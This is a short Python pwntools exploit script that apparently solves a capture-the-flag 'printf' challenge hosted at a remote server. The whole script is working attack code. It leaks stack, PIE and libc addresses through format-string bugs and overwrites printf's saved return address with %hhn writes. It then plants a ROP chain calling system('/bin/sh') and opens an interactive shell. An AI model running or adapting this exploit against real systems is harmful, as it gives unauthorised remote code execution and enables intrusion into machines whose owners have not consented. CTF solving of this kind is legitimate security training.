from pwn import *

context.binary = binary = ELF('./printf', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#p = process()
p = remote('pwn.blitzhack.xyz', 4646)

p.recvuntil(b'this: ')
stack_leak = int(p.recvline()[:-1], 16)
printf_saved_rip = stack_leak - 0x14
info(f'printf() saved rip @ {hex(printf_saved_rip)}')

restart_payload = b'%101$p|%141c%11$hhnaaaaa' + p64(printf_saved_rip)
p.send(restart_payload)

p.recvuntil(b'Here we go!!\n')
pie_leak = int(p.recvuntil(b'|')[:-1], 16)
binary.address = pie_leak - 0x10a0
info(f'pie leak @ {hex(pie_leak)}')
info(f'pie base @ {hex(binary.address)}')

restart2_payload = b'%11$s|%149c%12$hhnaaaaaa' + p64(binary.got.printf) + p64(printf_saved_rip)
p.send(restart2_payload)

p.recvuntil(b'Here we go!!\n')
printf_libc = u64(p.recvuntil(b'|')[0:-1].ljust(8, b'\x00'))
libc.address = printf_libc - libc.symbols.printf
info(f'printf() @ {hex(printf_libc)}')
info(f'libc @ {hex(libc.address)}')

r = ROP(libc)
rc = p64(r.find_gadget(['pop rdi','ret'])[0])
rc += p64(next(libc.search(b'/bin/sh\x00')))
rc += p64(r.find_gadget(['ret'])[0])
rc += p64(libc.symbols.system)

shell_payload = fmtstr_payload(8, {printf_saved_rip:rc}, write_size='short')
p.send(shell_payload)

p.recvrepeat(0.5)
success(f'*** SHELL ***')
p.interactive()
